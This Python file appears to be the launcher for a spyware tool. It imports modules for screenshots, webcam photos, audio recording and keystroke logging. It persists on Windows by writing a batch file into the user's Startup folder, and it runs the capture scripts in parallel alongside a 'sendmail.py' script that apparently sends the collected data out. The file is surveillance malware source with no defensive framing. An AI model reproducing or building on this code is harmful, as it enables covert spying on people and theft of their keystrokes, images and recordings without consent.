#!usr/bin/env python
import threading
import datetime
import os
from path import Path
from Screenshot import capture_ss
from CameraCapture import capture_photo
from audio import recording
from KeyStrokes import strokes
import time
import multiprocessing
import platform
try:
    import getpass
    import winreg as reg
except:
    pass


processes = ["audio.py", "Screenshot.py", "KeyStrokes.py", "sendmail.py"]


def auto_start(file_path=""):
    os_name = platform.system()
    try:
        if os_name == 'Windows':
            USER_NAME = getpass.getuser()
            if file_path == "":
                file_path = os.path.dirname(os.path.realpath(__file__))
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
            with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % file_path)
    except:
        pass


def file_name():
    currDT = datetime.datetime.now()
    current_time = currDT.strftime("%H:%M:%S").replace(":", "-")
    global screen
    screen= "SS_" + current_time + ".png"
    global camera
    camera= "capture_" + current_time + ".png"
    global audio
    audio= "audio_" + current_time + ".wav"
    global keys
    keys = "strokes" + current_time + ".txt"
    time.sleep(60)


def change_location():
    loc_ss = Path()
    if not os.path.exists(loc_ss):
        os.mkdir(loc_ss)
    os.chdir(loc_ss)


def terminal(process):
    os.system('python {}'.format(process))


def start():
    global screen
    global camera
    global audio
    global keys
    try:
        pool = multiprocessing.Pool(4)
        pool.map(terminal, processes)
    except KeyboardInterrupt:
        exit()


screen = ""
camera = ""
audio = ""
keys = ""
start()
